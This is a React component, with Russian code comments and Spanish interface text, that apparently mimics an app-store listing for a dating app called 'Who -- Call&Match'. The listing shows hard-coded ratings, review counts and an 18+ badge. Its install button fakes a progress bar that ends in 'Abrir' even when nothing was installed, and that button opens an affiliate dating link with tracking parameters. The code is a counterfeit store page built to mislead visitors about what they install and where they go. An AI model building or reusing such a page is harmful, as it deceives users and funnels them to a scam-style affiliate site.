import { Star, Download, Info } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useState, useEffect, useRef } from "react";

const AppHeader = () => {
  const [buttonState, setButtonState] = useState<'install' | 'installing' | 'open'>('install');
  const [progress, setProgress] = useState(0);
  const deferredPrompt = useRef<any>(null);

  useEffect(() => {
    const handler = (e: Event) => {
      console.log('beforeinstallprompt event triggered');
      e.preventDefault();
      deferredPrompt.current = e;
    };
    
    window.addEventListener('beforeinstallprompt', handler);

    // Проверяем, поддерживается ли PWA
    console.log('PWA support check:', {
      isStandalone: window.matchMedia('(display-mode: standalone)').matches,
      hasServiceWorker: 'serviceWorker' in navigator,
      isSecure: location.protocol === 'https:' || location.hostname === 'localhost',
      userAgent: navigator.userAgent
    });

    // Проверяем уже установленное приложение
    if (window.matchMedia('(display-mode: standalone)').matches) {
      console.log('App is already installed as PWA');
      setButtonState('open');
    }

    return () => {
      window.removeEventListener('beforeinstallprompt', handler);
    };
  }, []);

  const handleInstall = async () => {
    if (buttonState === 'install') {
      console.log('Install button clicked, deferredPrompt:', !!deferredPrompt.current);
      
      setButtonState('installing');
      setProgress(0);
      
      // Проверяем, можем ли показать prompt
      if (deferredPrompt.current) {
        try {
          console.log('Showing PWA install prompt');
          const result = await deferredPrompt.current.prompt();
          console.log('Prompt result:', result);
          
          const choiceResult = await deferredPrompt.current.userChoice;
          console.log('User choice result:', choiceResult.outcome);
          
          if (choiceResult.outcome === 'accepted') {
            console.log('User accepted the install prompt');
            setButtonState('open');
            setProgress(100);
          } else {
            console.log('User dismissed the install prompt');
            setButtonState('install');
            setProgress(0);
          }
          deferredPrompt.current = null;
        } catch (error) {
          console.log('Error showing install prompt:', error);
          // Показываем альтернативный способ
          showAlternativeInstall();
        }
      } else {
        console.log('No deferred prompt - showing alternative install method');
        showAlternativeInstall();
      }
    } else if (buttonState === 'open') {
      window.open('https://llqrbo.sweets4datings.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=220791&s2=2027339', '_blank');
    }
  };

  const showAlternativeInstall = () => {
    // Показываем инструкции по установке для Chrome/Safari
    const userAgent = navigator.userAgent.toLowerCase();
    
    if (userAgent.includes('chrome') && !userAgent.includes('edg')) {
      alert('Для установки приложения:\n1. Нажмите на три точки в адресной строке\n2. Выберите "Установить приложение"');
    } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
      alert('Для установки приложения:\n1. Нажмите кнопку "Поделиться"\n2. Выберите "На экран Домой"');
    } else {
      alert('Откройте это приложение в Chrome или Safari для установки');
    }
    
    // Анимация прогресса
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setButtonState('open');
          return 100;
        }
        return prev + 10;
      });
    }, 200);
  };

  return <div className="bg-card p-4 space-y-4">
      {/* App Icon and Basic Info */}
      <div className="flex items-start gap-4">
        <div className="w-20 h-20 bg-app-icon-bg rounded-2xl flex items-center justify-center">
          <span className="text-app-pink text-2xl font-bold">who</span>
        </div>
        <div className="flex-1">
          <h1 className="text-xl font-semibold text-foreground">Who -- Call&Match</h1>
          <p className="text-primary text-sm font-medium">Media Republic Apps</p>
          <p className="text-muted-foreground text-xs">Contiene anuncios • Compras en la aplicación</p>
        </div>
      </div>

      {/* Stats Row */}
      <div className="flex items-center justify-between text-center">
        <div className="flex items-center gap-1">
          <span className="text-lg font-semibold">4,3</span>
          <Star className="w-4 h-4 fill-app-star text-app-star" />
          <p className="text-xs text-muted-foreground ml-1">276 mil reseñas</p>
          <Info className="w-3 h-3 text-muted-foreground ml-1" />
        </div>
        
        <div className="flex flex-col items-center">
          <Download className="w-5 h-5 text-muted-foreground" />
          <span className="font-medium text-xs">169 MB</span>
        </div>
        
        <div className="text-center">
          <div className="bg-border text-xs px-2 py-1 rounded">18+</div>
          <p className="text-xs text-muted-foreground mt-1">Para mayores de 18 años</p>
        </div>
      </div>

      {/* Install Button */}
      <div className="relative">
        <Button 
          onClick={handleInstall}
          disabled={buttonState === 'installing'}
          className="w-full h-12 bg-primary hover:bg-primary/90 rounded-full text-base font-medium relative overflow-hidden"
        >
          {buttonState === 'installing' && (
            <div 
              className="absolute left-0 top-0 h-full bg-primary-foreground/20 transition-all duration-1000 ease-linear"
              style={{ width: `${progress}%` }}
            />
          )}
          <span className="relative z-10">
            {buttonState === 'install' && 'Instalar'}
            {buttonState === 'installing' && `Instalando... ${progress}%`}
            {buttonState === 'open' && 'Abrir'}
          </span>
        </Button>
      </div>
      
      <p className="text-xs text-muted-foreground text-center">
        Instalar en teléfono. Más dispositivos disponibles.
      </p>
    </div>;
};
export default AppHeader;
